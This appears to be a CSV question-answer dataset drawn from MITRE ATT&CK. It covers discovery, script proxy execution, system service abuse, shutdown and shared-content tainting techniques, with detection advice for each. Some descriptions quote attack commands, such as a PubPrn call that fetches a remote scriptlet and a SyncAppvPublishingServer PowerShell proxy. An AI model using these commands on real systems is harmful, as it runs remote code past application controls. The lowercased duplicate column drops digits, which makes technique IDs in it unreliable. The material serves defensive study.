Unnamed: 0,Question,Answer,processed_description
2915,"Which platforms does technique, System Owner/User Discovery primarily target according to Mitre Attack framework?","The technique System Owner/User Discovery targets or exploits these platforms Linux, Network, Windows, macOS",the technique system owneruser discovery targets or exploits these platforms linux network windows macos
2916,"How to detect or prevent technique, System Owner/User Discovery from being exploited?","`System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

For network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.","system and network discovery techniques normally occur throughout an operation as an adversary learns the environment data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained

monitor processes and commandline arguments for actions that could be taken to gather system and network information remote access tools with builtin features may interact directly with the windows api to gather information information may also be acquired through windows system management tools such as windows management instrumentationhttpsattackmitreorgtechniquest and powershellhttpsattackmitreorgtechniquest

for network infrastructure devices collect aaa logging to monitor show commands being run by nonstandard users from nonstandard locations"
2917,"What is the technique id for technique, System Owner/User Discovery according to mitre attack framework?",The technique id of the technique System Owner/User Discovery is T1033,the technique id of the technique system owneruser discovery is t
2918,"What are the tactics does this technique, System Owner/User Discovery belongs to?",The technique System Owner/User Discovery belongs to these tactics Discovery,the technique system owneruser discovery belongs to these tactics discovery
2919,"What is the description of technique, System Script Proxy Execution according to Mitre Attack framework?","Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",adversaries may use trusted scripts often signed with certificates to proxy the execution of malicious files several microsoft signed scripts that have been downloaded from microsoft or are default on windows installations can be used to proxy execution of other filescitation lolbas project this behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systemscitation github ultimate applocker bypass list
2920,"Which platforms does technique, System Script Proxy Execution primarily target according to Mitre Attack framework?",The technique System Script Proxy Execution targets or exploits these platforms Windows,the technique system script proxy execution targets or exploits these platforms windows
2921,"How to detect or prevent technique, System Script Proxy Execution from being exploited?","Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",monitor script processes such as cscript and commandline parameters for scripts like pubprnvbs that may be used to proxy execution of malicious files
2922,"What is the technique id for technique, System Script Proxy Execution according to mitre attack framework?",The technique id of the technique System Script Proxy Execution is T1216,the technique id of the technique system script proxy execution is t
2923,"What are the tactics does this technique, System Script Proxy Execution belongs to?",The technique System Script Proxy Execution belongs to these tactics Defense Evasion,the technique system script proxy execution belongs to these tactics defense evasion
2924,"What is the description of technique, System Script Proxy Execution: PubPrn according to Mitre Attack framework?","Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).","adversaries may use pubprn to proxy execution of malicious remote files pubprnvbs is a visual basichttpsattackmitreorgtechniquest script that publishes a printer to active directory domain services the script may be signed by microsoft and is commonly executed through the windows command shellhttpsattackmitreorgtechniquest via codecscriptexecode for example the following code publishes a printer within the specified domain codecscript pubprn printer ldapcncontainerdcdomaindccomcodecitation pubprn

adversaries may abuse pubprn to execute malicious payloads hosted on remote sitescitation enigmax pubprn bypass to do so adversaries may set the second codescriptcode parameter to reference a scriptlet file sct hosted on a remote site an example command is codepubprnvbs  scripthttpsmydomaincomfolderfilesctcode this behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script

in later versions of windows  codepubprnvbscode has been updated to prevent proxying execution from a remote site this is done by limiting the protocol specified in the second parameter to codeldapcode vice the codescriptcode moniker which could be used to reference remote code via https"
2925,"Which platforms does technique, System Script Proxy Execution: PubPrn primarily target according to Mitre Attack framework?",The technique System Script Proxy Execution: PubPrn targets or exploits these platforms Windows,the technique system script proxy execution pubprn targets or exploits these platforms windows
2926,"How to detect or prevent technique, System Script Proxy Execution: PubPrn from being exploited?","Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",monitor script processes such as cscript and commandline parameters for scripts like pubprnvbs that may be used to proxy execution of malicious files
2927,"What is the technique id for technique, System Script Proxy Execution: PubPrn according to mitre attack framework?",The technique id of the technique System Script Proxy Execution: PubPrn is T1216.001,the technique id of the technique system script proxy execution pubprn is t
2928,"What are the tactics does this technique, System Script Proxy Execution: PubPrn belongs to?",The technique System Script Proxy Execution: PubPrn belongs to these tactics Defense Evasion,the technique system script proxy execution pubprn belongs to these tactics defense evasion
2929,"What is the description of technique, System Script Proxy Execution: SyncAppvPublishingServer according to Mitre Attack framework?","Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)
    
The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)

Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by ""living off the land.""(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)

For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)

`SyncAppvPublishingServer.vbs ""n; {PowerShell}""`","adversaries may abuse syncappvpublishingservervbs to proxy execution of malicious powershellhttpsattackmitreorgtechniquest commands syncappvpublishingservervbs is a visual basic script associated with how windows virtualizes applications microsoft application virtualization or appvcitation   appv for example windows may render win applications to users as virtual applications allowing users to launch and interact with them as if they were installed locallycitation   appvcitation   appv
    
the syncappvpublishingservervbs script is legitimate may be signed by microsoft and is commonly executed from system through the command line via wscriptexecitation   appvcitation   appv

adversaries may abuse syncappvpublishingservervbs to bypass powershellhttpsattackmitreorgtechniquest execution restrictions and evade defensive counter measures by living off the landcitation   appvcitation   appv proxying execution may function as a trustedsigned alternative to directly invoking powershellexecitation   appv

for example  powershellhttpsattackmitreorgtechniquest commands may be invoked usingcitation   appv

syncappvpublishingservervbs n powershell"
2930,"Which platforms does technique, System Script Proxy Execution: SyncAppvPublishingServer primarily target according to Mitre Attack framework?",The technique System Script Proxy Execution: SyncAppvPublishingServer targets or exploits these platforms Windows,the technique system script proxy execution syncappvpublishingserver targets or exploits these platforms windows
2931,"How to detect or prevent technique, System Script Proxy Execution: SyncAppvPublishingServer from being exploited?",,nan
2932,"What is the technique id for technique, System Script Proxy Execution: SyncAppvPublishingServer according to mitre attack framework?",The technique id of the technique System Script Proxy Execution: SyncAppvPublishingServer is T1216.002,the technique id of the technique system script proxy execution syncappvpublishingserver is t
2933,"What are the tactics does this technique, System Script Proxy Execution: SyncAppvPublishingServer belongs to?",The technique System Script Proxy Execution: SyncAppvPublishingServer belongs to these tactics Defense Evasion,the technique system script proxy execution syncappvpublishingserver belongs to these tactics defense evasion
2934,"What is the description of technique, System Service Discovery according to Mitre Attack framework?","Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.

Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","adversaries may try to gather information about registered local system services adversaries may obtain information about services using tools as well as os utility commands such as codesc querycode codetasklist svccode codesystemctl typeservicecode and codenet startcode

adversaries may use the information from system service discoveryhttpsattackmitreorgtechniquest during automated discovery to shape followon behaviors including whether or not the adversary fully infects the target andor attempts specific actions"
2935,"Which platforms does technique, System Service Discovery primarily target according to Mitre Attack framework?","The technique System Service Discovery targets or exploits these platforms Linux, Windows, macOS",the technique system service discovery targets or exploits these platforms linux windows macos
2936,"How to detect or prevent technique, System Service Discovery from being exploited?","System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","system and network discovery techniques normally occur throughout an operation as an adversary learns the environment data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities such as lateral movement based on the information obtained

monitor processes and commandline arguments for actions that could be taken to gather system information related to services remote access tools with builtin features may interact directly with the windows api to gather information information may also be acquired through windows system management tools such as windows management instrumentationhttpsattackmitreorgtechniquest and powershellhttpsattackmitreorgtechniquest"
2937,"What is the technique id for technique, System Service Discovery according to mitre attack framework?",The technique id of the technique System Service Discovery is T1007,the technique id of the technique system service discovery is t
2938,"What are the tactics does this technique, System Service Discovery belongs to?",The technique System Service Discovery belongs to these tactics Discovery,the technique system service discovery belongs to these tactics discovery
2939,"What is the description of technique, System Services according to Mitre Attack framework?","Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",adversaries may abuse system services or daemons to execute commands or programs adversaries can execute malicious content by interacting with or creating services either locally or remotely many services are set to run at boot which can aid in achieving persistence create or modify system processhttpsattackmitreorgtechniquest but adversaries can also abuse services for onetime or temporary execution
2940,"Which platforms does technique, System Services primarily target according to Mitre Attack framework?","The technique System Services targets or exploits these platforms Linux, Windows, macOS",the technique system services targets or exploits these platforms linux windows macos
2941,"How to detect or prevent technique, System Services from being exploited?","Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.",monitor for command line invocations of tools capable of modifying services that doesnt correspond to normal usage patterns and known software patch cycles etc also monitor for changes to executables and other files associated with services changes to windows services may also be reflected in the registry
2942,"What is the technique id for technique, System Services according to mitre attack framework?",The technique id of the technique System Services is T1569,the technique id of the technique system services is t
2943,"What are the tactics does this technique, System Services belongs to?",The technique System Services belongs to these tactics Execution,the technique system services belongs to these tactics execution
2944,"What is the description of technique, System Services: Launchctl according to Mitre Attack framework?","Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
","adversaries may abuse launchctl to execute commands or programs launchctl interfaces with launchd the service management framework for macos launchctl supports taking subcommands on the commandline interactively or even redirected from standard inputcitation launchctl man

adversaries use launchctl to execute commands and programs as launch agenthttpsattackmitreorgtechniquests or launch daemonhttpsattackmitreorgtechniquests common subcommands include codelaunchctl loadcodecodelaunchctl unloadcode and codelaunchctl startcode adversaries can use scripts or manually run the commands codelaunchctl load w slibrarylaunchagentsscode or codebinlaunchctl loadcode to execute launch agenthttpsattackmitreorgtechniquests or launch daemonhttpsattackmitreorgtechniquestscitation sofacy komplex trojancitation  macos common tools and techniques
"
2945,"Which platforms does technique, System Services: Launchctl primarily target according to Mitre Attack framework?",The technique System Services: Launchctl targets or exploits these platforms macOS,the technique system services launchctl targets or exploits these platforms macos
2946,"How to detect or prevent technique, System Services: Launchctl from being exploited?","Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. 

Monitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. 

When removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files.","every launch agent and launch daemon must have a corresponding plist file on disk which can be monitored monitor for recently modified or created plist files with a significant change to the executable path executed with the commandline codelaunchctlcode command plist files are located in the root system and users codelibrarylaunchagentscode or codelibrarylaunchdaemonscode folders 

monitor commandline execution of the codelaunchctlcode command immediately followed by abnormal network connections launch agenthttpsattackmitreorgtechniquests or launch daemonhttpsattackmitreorgtechniquests with executable paths pointing to codetmpcode and codesharedcode folders locations are potentially suspicious 

when removing launch agenthttpsattackmitreorgtechniquests or launch daemonhttpsattackmitreorgtechniquests ensure the services are unloaded prior to deleting plist files"
2947,"What is the technique id for technique, System Services: Launchctl according to mitre attack framework?",The technique id of the technique System Services: Launchctl is T1569.001,the technique id of the technique system services launchctl is t
2948,"What are the tactics does this technique, System Services: Launchctl belongs to?",The technique System Services: Launchctl belongs to these tactics Execution,the technique system services launchctl belongs to these tactics execution
2949,"What is the description of technique, System Services: Service Execution according to Mitre Attack framework?","Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.","adversaries may abuse the windows service control manager to execute malicious commands or payloads the windows service control manager codeservicesexecode is an interface to manage and manipulate servicescitation microsoft service control manager the service control manager is accessible to users via gui components as well as system utilities such as codescexecode and nethttpsattackmitreorgsoftwares

psexechttpsattackmitreorgsoftwares can also be used to execute commands or payloads via a temporary windows service created through the service control manager apicitation russinovich sysinternals tools such as psexechttpsattackmitreorgsoftwares and codescexecode can accept remote servers as arguments and may be used to conduct remote execution

adversaries may leverage these mechanisms to execute malicious content this can be done by either executing a new or modified service this technique is the execution used in conjunction with windows servicehttpsattackmitreorgtechniquest during service persistence or privilege escalation"
2950,"Which platforms does technique, System Services: Service Execution primarily target according to Mitre Attack framework?",The technique System Services: Service Execution targets or exploits these platforms Windows,the technique system services service execution targets or exploits these platforms windows
2951,"How to detect or prevent technique, System Services: Service Execution from being exploited?","Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",changes to service registry entries and command line invocation of tools capable of modifying services that do not correlate with known software patch cycles etc may be suspicious if a service is used only to execute a binary or script and not to persist then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken as is the case with the common administrator tool psexechttpsattackmitreorgsoftwares
2952,"What is the technique id for technique, System Services: Service Execution according to mitre attack framework?",The technique id of the technique System Services: Service Execution is T1569.002,the technique id of the technique system services service execution is t
2953,"What are the tactics does this technique, System Services: Service Execution belongs to?",The technique System Services: Service Execution belongs to these tactics Execution,the technique system services service execution belongs to these tactics execution
2954,"What is the description of technique, System Shutdown/Reboot according to Mitre Attack framework?","Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)

Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.

Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)","adversaries may shutdownreboot systems to interrupt access to or aid in the destruction of those systems operating systems may contain commands to initiate a shutdownreboot of a machine or network device in some cases these commands may also be used to initiate a shutdownreboot of a remote computer or network device via network device clihttpsattackmitreorgtechniquest eg codereloadcodecitation microsoft shutdown oct citation alerttaa

shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident responserecovery

adversaries may attempt to shutdownreboot a system after impacting it in other ways such as disk structure wipehttpsattackmitreorgtechniquest or inhibit system recoveryhttpsattackmitreorgtechniquest to hasten the intended effects on system availabilitycitation talos nyetya june citation talos olympic destroyer "
2955,"Which platforms does technique, System Shutdown/Reboot primarily target according to Mitre Attack framework?","The technique System Shutdown/Reboot targets or exploits these platforms Linux, Network, Windows, macOS",the technique system shutdownreboot targets or exploits these platforms linux network windows macos
2956,"How to detect or prevent technique, System Shutdown/Reboot from being exploited?","Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the <code>reload</code> command.",use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems windows event logs may also designate activity associated with a shutdownreboot ex event id  and  unexpected or unauthorized commands from network cli on network devices may also be associated with shutdownreboot eg the codereloadcode command
2957,"What is the technique id for technique, System Shutdown/Reboot according to mitre attack framework?",The technique id of the technique System Shutdown/Reboot is T1529,the technique id of the technique system shutdownreboot is t
2958,"What are the tactics does this technique, System Shutdown/Reboot belongs to?",The technique System Shutdown/Reboot belongs to these tactics Impact,the technique system shutdownreboot belongs to these tactics impact
2959,"What is the description of technique, System Time Discovery according to Mitre Attack framework?","An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)

On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)

In addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)

This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)","an adversary may gather the system time andor time zone settings from a local or remote system the system time is set and stored by services such as the windows time service on windows or codesystemsetupcode on macoscitation msdn system timecitation technet windows time servicecitation systemsetup mac time these time settings may also be synchronized between systems and services in an enterprise network typically accomplished with a network time server within a domaincitation mac time synccitation linux system time

system time information may be gathered in a number of ways such as with nethttpsattackmitreorgsoftwares on windows by performing codenet time hostnamecode to gather the system time on a remote system the victims time zone may also be inferred from the current system time or gathered by using codewtm tzcodecitation technet windows time service in addition adversaries can discover device uptime through functions such as codegettickcountcode to determine how long it has been since the system booted upcitation virtualizationsandbox evasion

on network devices network device clihttpsattackmitreorgtechniquest commands such as show clock detail can be used to see the current time configurationcitation showclockdetailciscocmd

in addition system calls  such as codetimecode  have been used to collect the current time on linux devicescitation magnet goblin on macos systems adversaries may use commands such as codesystemsetup gettimezonecode or codetimeintervalsincenowcode to gather current time zone information or current date and timecitation system information discovery techniquecitation eset dazzlespy jan 

this information could be useful for performing other techniques such as executing a file with a scheduled taskjobhttpsattackmitreorgtechniquestcitation rsa eu theyre inside or to discover locality information based on time zone to assist in victim targeting ie system location discoveryhttpsattackmitreorgtechniquest adversaries may also use knowledge of system time as part of a time bomb or delaying execution until a specified datetimecitation anyrun timebomb"
2960,"Which platforms does technique, System Time Discovery primarily target according to Mitre Attack framework?","The technique System Time Discovery targets or exploits these platforms Linux, Network, Windows, macOS",the technique system time discovery targets or exploits these platforms linux network windows macos
2961,"How to detect or prevent technique, System Time Discovery from being exploited?","Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.

For network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.","commandline interface monitoring may be useful to detect instances of netexe or other commandline utilities being used to gather system time or time zone methods of detecting api use for gathering this information are likely less useful due to how often they may be used by legitimate software

for network infrastructure devices collect aaa logging to monitor show commands being run by nonstandard users from nonstandard locations"
2962,"What is the technique id for technique, System Time Discovery according to mitre attack framework?",The technique id of the technique System Time Discovery is T1124,the technique id of the technique system time discovery is t
2963,"What are the tactics does this technique, System Time Discovery belongs to?",The technique System Time Discovery belongs to these tactics Discovery,the technique system time discovery belongs to these tactics discovery
2964,"What is the description of technique, Taint Shared Content according to Mitre Attack framework?","
Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","
adversaries may deliver payloads to remote systems by adding content to shared storage locations such as network drives or internal code repositories content stored on network drives or in other shared locations may be tainted by adding malicious programs scripts or exploit code to otherwise valid files once a user opens the shared tainted content the malicious portion can be executed to run the adversarys code on a remote system adversaries may use tainted shared content to move laterally

a directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory it uses shortcut modificationhttpsattackmitreorgtechniquest of directory lnk files that use masqueradinghttpsattackmitreorgtechniquest to look like the real directories which are hidden through hidden files and directorieshttpsattackmitreorgtechniquest the malicious lnkbased directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the users expected action still occurs when used with frequently used network directories the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts citation retwin directory share pivot

adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory the malware may modify the original entry point oep of the healthy binary to ensure that it is executed before the legitimate code the infection could continue to spread via the newly infected file when it is executed by a remote system these infections may target both binary and nonbinary formats that end with extensions including but not limited to exe dll scr bat andor vbs"
2965,"Which platforms does technique, Taint Shared Content primarily target according to Mitre Attack framework?","The technique Taint Shared Content targets or exploits these platforms Linux, Office 365, SaaS, Windows, macOS",the technique taint shared content targets or exploits these platforms linux office  saas windows macos
2966,"How to detect or prevent technique, Taint Shared Content from being exploited?","Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.

Frequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.","processes that write or overwrite many files to a network shared directory may be suspicious monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to command and control and possible network discovery techniques

frequently scan shared network directories for malicious files hidden files lnk files and other file types that may not typical exist in directories used to share specific types of content"
2967,"What is the technique id for technique, Taint Shared Content according to mitre attack framework?",The technique id of the technique Taint Shared Content is T1080,the technique id of the technique taint shared content is t
2968,"What are the tactics does this technique, Taint Shared Content belongs to?",The technique Taint Shared Content belongs to these tactics Lateral Movement,the technique taint shared content belongs to these tactics lateral movement
